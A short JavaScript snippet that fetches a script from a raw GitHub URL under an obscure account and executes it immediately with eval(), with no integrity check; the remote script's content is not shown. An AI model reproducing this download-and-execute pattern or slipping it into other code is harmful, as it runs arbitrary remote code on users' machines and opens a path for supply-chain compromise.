function runExternalScript() {
  const scriptUrl = 'https://raw.githubusercontent.com/dleiszarjeisalther/Jav1314/refs/heads/main/AllCompilation.js';

  fetch(scriptUrl)
    .then(response => response.text())
    .then(scriptContent => {
      // Execute the fetched JavaScript code
      eval(scriptContent);
    })
    .catch(error => {
      console.error('Error loading or executing the script:', error);
    });
}

// Call the function to run the script
runExternalScript();
